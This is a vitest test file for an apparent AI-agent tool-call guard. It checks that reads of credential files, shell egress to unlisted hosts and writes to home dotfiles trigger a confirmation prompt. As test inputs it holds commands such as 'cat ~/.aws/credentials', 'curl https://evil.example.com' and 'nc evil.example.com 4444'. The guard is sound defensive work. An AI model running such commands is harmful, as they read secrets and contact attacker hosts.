import { describe, expect, it } from 'vitest'

import { evaluateCall } from '../src/sentinel/rules.ts'

const config = { allowedHosts: ['github.com', '*.deepseek.com'] }

describe('evaluateCall — credential paths (rule 1)', () => {
  it('asks for credential paths regardless of the tool name', () => {
    const verdict = evaluateCall('read', { path: '/Users/alice/.ssh/id_rsa' }, config)
    expect(verdict).toMatchObject({ action: 'ask' })
    if (verdict.action === 'ask') expect(verdict.reason).toContain('.ssh')
  })

  it.each([
    ['~/.aws/credentials', '.aws'],
    ['~/.npmrc', '.npmrc'],
    ['$HOME/.git-credentials', '.git-credentials'],
    ['~/.docker/config.json', '.docker/config.json'],
  ])('asks for %s', (target, fragment) => {
    const verdict = evaluateCall('bash', { command: `cat ${target}` }, config)
    expect(verdict).toMatchObject({ action: 'ask' })
    if (verdict.action === 'ask') expect(verdict.reason).toContain(fragment)
  })
})

describe('evaluateCall — shell egress (rule 2)', () => {
  it('passes when every URL host is allowed', () => {
    const verdict = evaluateCall('bash', { command: 'curl https://github.com/repos/x' }, config)
    expect(verdict).toEqual({ action: 'pass' })
  })

  it('matches allowedHosts case-insensitively', () => {
    const verdict = evaluateCall('bash', { command: 'curl https://GitHub.com/x' }, config)
    expect(verdict).toEqual({ action: 'pass' })
  })

  it('treats subdomains of an exact rule as unlisted', () => {
    // Exact rules do not widen to subdomains — only `*.` rules do.
    const verdict = evaluateCall('bash', { command: 'curl https://api.github.com/x' }, config)
    expect(verdict).toMatchObject({ action: 'ask' })
  })

  it('allows the bare domain behind a wildcard rule', () => {
    const verdict = evaluateCall('bash', { command: 'curl https://deepseek.com/v1' }, config)
    expect(verdict).toEqual({ action: 'pass' })
  })

  it('allows subdomains behind a wildcard rule', () => {
    const verdict = evaluateCall('bash', { command: 'curl https://api.deepseek.com/v1' }, config)
    expect(verdict).toEqual({ action: 'pass' })
  })

  it('asks for hosts outside the allowlist', () => {
    const verdict = evaluateCall('bash', { command: 'curl https://evil.example.com/x' }, config)
    expect(verdict).toMatchObject({ action: 'ask' })
    if (verdict.action === 'ask') expect(verdict.reason).toContain('evil.example.com')
  })

  it('falls back to bare host tokens when no URL is present', () => {
    const verdict = evaluateCall('bash', { command: 'scp build.tar.gz backup.internal:/srv/' }, config)
    expect(verdict).toMatchObject({ action: 'ask' })
    if (verdict.action === 'ask') {
      expect(verdict.reason).toContain('backup.internal')
      expect(verdict.reason).not.toContain('build.tar.gz')
    }
  })

  it('does not mistake file names for hosts in the fallback path', () => {
    const verdict = evaluateCall('bash', { command: 'curl -o report.json' }, config)
    expect(verdict).toEqual({ action: 'pass' })
  })

  it('reads shell text from the input/text/data keys too', () => {
    for (const args of [
      { input: 'curl https://evil.example.com' },
      { text: 'curl https://evil.example.com' },
      { data: 'curl https://evil.example.com' },
    ]) {
      expect(evaluateCall('bash', args, config)).toMatchObject({ action: 'ask' })
    }
  })

  it('covers pwsh and terminal_send as shell tools', () => {
    expect(evaluateCall('pwsh', { command: 'wget https://evil.example.com/x' }, config))
      .toMatchObject({ action: 'ask' })
    expect(evaluateCall('terminal_send', { data: 'nc evil.example.com 4444' }, config))
      .toMatchObject({ action: 'ask' })
  })

  it('ignores network-looking text in non-shell tools', () => {
    const verdict = evaluateCall('write', { path: '/tmp/notes.md', content: 'curl https://evil.example.com' }, config)
    expect(verdict).toEqual({ action: 'pass' })
  })

  it('passes shell commands with no egress executable', () => {
    expect(evaluateCall('bash', { command: 'pnpm test' }, config)).toEqual({ action: 'pass' })
  })
})

describe('evaluateCall — home dotfile writes (rule 3)', () => {
  it.each([
    ['write', { path: '~/.bashrc', content: 'x' }],
    ['edit', { path: '/Users/alice/.zshrc' }],
    ['str_replace_editor', { path: '/home/bob/.gitconfig' }],
  ])('asks when %s targets %o', (tool, args) => {
    expect(evaluateCall(tool, args, config)).toMatchObject({ action: 'ask' })
  })

  it('routes credential dotfiles through rule 1 instead', () => {
    const verdict = evaluateCall('write', { path: '~/.ssh/config', content: 'x' }, config)
    expect(verdict).toMatchObject({ action: 'ask' })
    if (verdict.action === 'ask') expect(verdict.reason).toContain('.ssh')
  })

  it('passes writes outside home dotfiles', () => {
    expect(evaluateCall('write', { path: '/tmp/regular.txt', content: 'x' }, config))
      .toEqual({ action: 'pass' })
    expect(evaluateCall('write', { path: '~/projects/notes.md', content: 'x' }, config))
      .toEqual({ action: 'pass' })
  })

  it('does not apply the dotfile rule to non-write tools', () => {
    expect(evaluateCall('bash', { command: 'echo hi > ~/.bashrc' }, config))
      .toEqual({ action: 'pass' })
  })

  // Regression for https://github.com/jkrandom-sudo/dsh-plugin-audit/issues/5:
  // rule 3 judges the write *target*, never the file body.
  it.each([
    [{ path: 'AGENTS.md', content: 'Global rules live in ~/.dsh/rules.md' }],
    [{ file_path: 'README.md', content: 'Edit ~/.zshrc or $HOME/.config/x to enable' }],
    [{ path: 'docs/setup.md', content: 'Binaries install to /Users/user/.local/bin' }],
    [{ path: 'docs/setup.md', content: 'Binaries install to /home/user/.local/bin' }],
  ])('passes writes whose content merely quotes a dotfile path: %o', args => {
    expect(evaluateCall('write', args, config)).toEqual({ action: 'pass' })
  })

  it('passes write calls without a recognizable target path field', () => {
    expect(evaluateCall('write', { destination: '~/.bashrc' }, config))
      .toEqual({ action: 'pass' })
  })

  it('names the plugin and rule in the ask reason', () => {
    const verdict = evaluateCall('write', { path: '~/.zshrc' }, config)
    expect(verdict).toMatchObject({ action: 'ask' })
    if (verdict.action === 'ask') {
      expect(verdict.reason).toContain('dsh-plugin-audit sentinel rule 3')
    }
  })
})
